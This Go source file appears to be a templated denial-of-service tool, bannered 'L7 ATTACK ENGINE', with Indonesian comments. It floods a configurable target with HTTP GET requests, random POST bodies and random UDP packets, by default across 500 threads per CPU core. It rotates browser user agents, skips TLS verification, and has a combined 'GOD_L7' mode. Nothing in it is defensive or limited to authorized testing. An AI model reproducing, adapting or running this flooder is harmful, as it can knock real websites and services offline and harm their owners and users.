package main

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// ==================== TEMPLATE VARIABLES ====================
var (
	targetURL = "{{.TargetURL}}"
	duration  = "{{.Duration}}"
	threads   = "{{.Threads}}"
	method    = "{{.Method}}"
)

// ==================== KONSTANTA ====================
const ()

// ==================== GLOBAL STATE ====================
var (
	totalRequests uint64
	totalBytes    uint64
	startTime     time.Time
	stopTime      time.Time
	cfgThreads    int
	cfgDuration   int
	cfgMethod     string
)

// ==================== USER AGENTS ====================
var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/121.0",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
}

// ==================== HTTP FLOOD ====================
func httpFloodWorker(id int, wg *sync.WaitGroup) {
	defer wg.Done()

	client := &http.Client{
		Timeout: 10 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			MaxIdleConns:    100,
		},
	}

	for time.Now().Before(stopTime) {
		req, _ := http.NewRequest("GET", targetURL, nil)
		req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
		req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
		req.Header.Set("Connection", "keep-alive")

		resp, err := client.Do(req)
		if err != nil {
			atomic.AddUint64(&totalRequests, 1)
			continue
		}
		body, _ := io.ReadAll(resp.Body)
		atomic.AddUint64(&totalBytes, uint64(len(body)))
		resp.Body.Close()
		atomic.AddUint64(&totalRequests, 1)
	}
}

// ==================== POST FLOOD ====================
func postFloodWorker(id int, wg *sync.WaitGroup) {
	defer wg.Done()

	client := &http.Client{
		Timeout: 10 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	for time.Now().Before(stopTime) {
		postData := []byte("data=" + randomString(100))
		req, _ := http.NewRequest("POST", targetURL, bytes.NewBuffer(postData))
		req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

		resp, err := client.Do(req)
		if err != nil {
			atomic.AddUint64(&totalRequests, 1)
			continue
		}
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
		atomic.AddUint64(&totalRequests, 1)
		atomic.AddUint64(&totalBytes, uint64(len(postData)))
	}
}

// ==================== UDP FLOOD ====================
func udpFloodWorker(id int, wg *sync.WaitGroup) {
	defer wg.Done()

	parsed, _ := url.Parse(targetURL)
	host := parsed.Hostname()
	port := "80"
	if parsed.Scheme == "https" {
		port = "443"
	}
	if strings.Contains(parsed.Host, ":") {
		parts := strings.Split(parsed.Host, ":")
		host = parts[0]
		port = parts[1]
	}

	addr := fmt.Sprintf("%s:%s", host, port)
	udpAddr, _ := net.ResolveUDPAddr("udp", addr)
	conn, err := net.DialUDP("udp", nil, udpAddr)
	if err != nil {
		return
	}
	defer conn.Close()

	payload := make([]byte, 512)
	for i := range payload {
		payload[i] = byte(rand.Intn(256))
	}

	for time.Now().Before(stopTime) {
		conn.Write(payload)
		atomic.AddUint64(&totalRequests, 1)
		atomic.AddUint64(&totalBytes, uint64(len(payload)))
		time.Sleep(time.Millisecond)
	}
}

// ==================== HELPER ====================
func randomString(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

// ==================== INIT ====================
func initConfig() {
	cfgDuration, _ = strconv.Atoi(duration)
	if cfgDuration <= 0 {
		cfgDuration = 60
	}

	baseThreads, _ := strconv.Atoi(threads)
	if baseThreads <= 0 {
		baseThreads = 500
	}
	cfgThreads = baseThreads * runtime.NumCPU()

	cfgMethod = strings.ToUpper(strings.TrimSpace(method))
	if cfgMethod == "" {
		cfgMethod = "GOD_L7"
	}

	startTime = time.Now()
	stopTime = startTime.Add(time.Duration(cfgDuration) * time.Second)
}

// ==================== MAIN ====================
func main() {
	initConfig()

	// Banner
	fmt.Printf("\n")
	fmt.Printf("╔════════════════════════════════════════════════════════════════╗\n")
	fmt.Printf("║              L7 ATTACK ENGINE - SIMPLIFIED v1.0                ║\n")
	fmt.Printf("╠════════════════════════════════════════════════════════════════╣\n")
	fmt.Printf("║ Target: %-50s ║\n", targetURL)
	fmt.Printf("║ Duration: %ds | Threads: %d | Method: %s\n", cfgDuration, cfgThreads, cfgMethod)
	fmt.Printf("╚════════════════════════════════════════════════════════════════╝\n")
	fmt.Printf("\n")

	var wg sync.WaitGroup

	// Jalankan sesuai method
	switch cfgMethod {
	case "HTTP_FLOOD":
		for i := 0; i < cfgThreads; i++ {
			wg.Add(1)
			go httpFloodWorker(i, &wg)
		}
	case "POST_FLOOD":
		for i := 0; i < cfgThreads; i++ {
			wg.Add(1)
			go postFloodWorker(i, &wg)
		}
	case "UDP_FLOOD":
		for i := 0; i < cfgThreads; i++ {
			wg.Add(1)
			go udpFloodWorker(i, &wg)
		}
	default: // GOD_L7 atau apapun
		// HTTP Flood + UDP Flood
		httpThreads := cfgThreads / 2
		udpThreads := cfgThreads - httpThreads
		for i := 0; i < httpThreads; i++ {
			wg.Add(1)
			go httpFloodWorker(i, &wg)
		}
		for i := 0; i < udpThreads; i++ {
			wg.Add(1)
			go udpFloodWorker(i, &wg)
		}
	}

	// Progress reporter
	go func() {
		ticker := time.NewTicker(5 * time.Second)
		for {
			select {
			case <-ticker.C:
				elapsed := time.Since(startTime).Seconds()
				reqs := atomic.LoadUint64(&totalRequests)
				bytes := atomic.LoadUint64(&totalBytes)
				rps := float64(reqs) / elapsed
				mbps := (float64(bytes) * 8.0) / (elapsed * 1024 * 1024)
				fmt.Printf("\r⏳ %.0fs | RPS: %.0f | MBPS: %.1f | Requests: %s",
					elapsed, rps, mbps, formatNum(reqs))
			default:
				time.Sleep(1 * time.Second)
			}
		}
	}()

	wg.Wait()

	// Final stats
	reqs := atomic.LoadUint64(&totalRequests)
	bytes := atomic.LoadUint64(&totalBytes)
	dur := uint64(cfgDuration)

	fmt.Printf("\n\n")
	fmt.Printf("╔════════════════════════════════════════════════════════════════╗\n")
	fmt.Printf("║                   FINAL L7 STATISTICS                          ║\n")
	fmt.Printf("╠════════════════════════════════════════════════════════════════╣\n")
	fmt.Printf("║  📦 TOTAL REQUESTS:   %-20s                     ║\n", formatNum(reqs))
	fmt.Printf("║  📊 TOTAL DATA:       %.2f MB (%.2f GB)                     ║\n",
		float64(bytes)/(1024*1024), float64(bytes)/(1024*1024*1024))
	fmt.Printf("║  ⚡ AVERAGE RPS:      %-20s                     ║\n", formatNum(reqs/dur))
	fmt.Printf("║  🌐 AVERAGE MBPS:     %.2f                                   ║\n",
		(float64(bytes*8)/float64(dur))/(1024*1024))
	fmt.Printf("║  💀 AVERAGE GBPS:     %.2f                                   ║\n",
		(float64(bytes*8)/float64(dur))/(1024*1024*1024))
	fmt.Printf("╚════════════════════════════════════════════════════════════════╝\n")
}

func formatNum(n uint64) string {
	if n < 1000 {
		return fmt.Sprintf("%d", n)
	}
	if n < 1000000 {
		return fmt.Sprintf("%.1fK", float64(n)/1000)
	}
	if n < 1000000000 {
		return fmt.Sprintf("%.1fM", float64(n)/1000000)
	}
	return fmt.Sprintf("%.1fB", float64(n)/1000000000)
}
